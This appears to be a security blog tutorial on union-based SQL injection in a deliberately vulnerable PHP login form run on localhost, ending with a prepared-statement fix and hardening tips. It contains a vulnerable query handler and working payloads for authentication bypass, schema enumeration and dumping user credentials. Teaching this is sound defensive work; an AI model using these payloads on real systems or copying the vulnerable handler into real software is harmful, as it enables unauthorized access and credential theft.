---
title: "SQL injection in a login form: from payload to impact"
description: "A hands-on walkthrough of union-based SQL injection in a deliberately vulnerable login form, and how prepared statements close the hole."
date: "2026-10-28"
category: "Security Research"
tags: ["web", "sql-injection", "owasp", "php"]
featured: true
draft: false
---

SQL injection is still one of the most common web vulnerabilities, decades after everyone agreed it shouldn't be. The reason is simple: string concatenation is convenient, and security review is not.

This post walks through a union-based injection in a small login form running in a local lab. The application is deliberately vulnerable and everything below happens on `localhost`.

> **Lab only.** Never test payloads against a system you don't own or have explicit written permission to test. Unauthorized access is a crime, not a research technique.

## The target

The login handler looks roughly like this:

```php
<?php
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT id, username, role FROM users
          WHERE username = '$username' AND password = '$password'";

$result = mysqli_query($conn, $query);
$user = mysqli_fetch_assoc($result);
```

The input is interpolated straight into the query. There is no escaping and no parameter binding. That's the whole vulnerability.

## Confirming the injection

The first step is always the same: confirm that user input changes the logical structure of the query. A single quote should break the syntax:

```http
POST /login.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin'&password=test
```

A raw database error is a strong signal, but it isn't required. Blind injection is slower but just as real.

Next, try a payload that makes the condition always true:

```sql
username: ' OR 1=1 -- -
password: anything
```

The resulting query becomes:

```sql
SELECT id, username, role FROM users
WHERE username = '' OR 1=1 -- -' AND password = 'anything'
```

Everything after `--` is a comment, so the password check disappears. If the app logs us in as the first user in the table, the injection is confirmed.

## Turning it into data extraction

Authentication bypass is only the beginning. Since the query returns rows that the page renders, we can use `UNION SELECT` to pull data from other tables. The trick is matching the column count.

```sql
' UNION SELECT 1, 2, 3 -- -
```

If the page renders `2` and `3`, the query has three columns and two of them are reflected. From there, enumerate the schema:

```sql
' UNION SELECT 1, table_name, 3
FROM information_schema.tables
WHERE table_schema = database() -- -
```

Then the columns of the table that matters:

```sql
' UNION SELECT 1, column_name, 3
FROM information_schema.columns
WHERE table_name = 'users' -- -
```

And finally the data:

```sql
' UNION SELECT 1, username, password FROM users -- -
```

The same database connection that authenticates users can read every table the application user has access to.

## Fixing it properly

Escaping quotes is not a fix. Blacklisting keywords is not a fix. The fix is to stop treating data as SQL syntax:

```php
<?php
$stmt = $conn->prepare(
    "SELECT id, username, role FROM users
     WHERE username = ? AND password = ?"
);

$stmt->bind_param("ss", $_POST['username'], $_POST['password']);
$stmt->execute();
$result = $stmt->get_result();
```

With prepared statements, the database parses the query first and then receives the values separately. A payload like `' OR 1=1 -- -` is stored as a literal string, not interpreted as SQL.

A few additional hardening steps are worth the effort:

- Use least-privilege database accounts. The login handler rarely needs `DROP TABLE`.
- Hash passwords with `password_hash()` and verify with `password_verify()`. Never compare plaintext.
- Return generic error messages to users, and log the details server-side.
- Add rate limiting to slow down credential stuffing and blind injection attempts.
- Keep a WAF as a detection layer, not as your primary defense.

## Takeaways

The interesting part of this lab isn't the payload. It's how small the distance is between a missing pair of quotes and full database disclosure. Input handling is a security boundary, and string-concatenated queries erase it.

When reviewing code, grep for query construction first. If user input touches a query string directly, stop and fix it before looking at anything else.
